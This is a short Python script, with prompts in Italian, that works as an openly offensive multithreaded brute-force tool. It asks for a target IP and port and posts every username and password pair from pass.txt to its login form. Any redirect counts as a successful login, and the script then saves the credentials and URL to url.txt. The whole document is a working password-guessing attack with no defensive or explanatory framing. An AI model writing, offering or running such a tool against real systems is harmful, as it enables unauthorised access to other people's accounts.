import requests,os,sys
from threading import Thread
listT = []
class MyThread(Thread):
    def __init__(self,url,stringa,complete):
        Thread.__init__(self)
        self.stringa = stringa
        self.url = url
        self.ferma = False
        self.complete = complete
    def run(self):
        while not self.ferma:
            payload = {"username": "","password" : ""}
            for x in self.stringa:
                for y in self.complete:
                    payload["password"] = y.strip()
                    payload["username"] = x.strip()
                    print(x.strip(),y.strip())
                    r = requests.post(self.url,data=payload)
                    if str(r.url) != url:
                        os.system("cls")
                        f = open("url.txt","w")
                        print(f"user --> {payload['username']}\npassword --> {payload['password']}\nurl --> {r.url}",file=f)
                        self.ferma=True
                        f.close()
                        r.close()
                        self.stop()
                    payload["password"] = []
                    r.close()
    def stop(self):
        self.ferma = True
        print("mi fermo")
        sys.exit()
        
try:
    f = open("pass.txt","r")
    stringa = f.readlines()
    f.close()
    numT = int(input("Quanti thread vuoi usare: "))
    lung = len(stringa)/numT
    url = str("".join(["http://"+input("Inserisci l'ip e porta da attaccare [ip:port]: ")+"/"]).replace(" ",""))
    print(f"Faccio brute force su {url}")   
    for i in range(numT):
            listT.append(MyThread(url,stringa[int(i*lung):int(lung*i+lung)].copy(),stringa.copy()))
            listT[-1].start()
except Exception as e:
    print(f"Errore:\n{e}\n")
finally:
    for th in listT:
        th.join()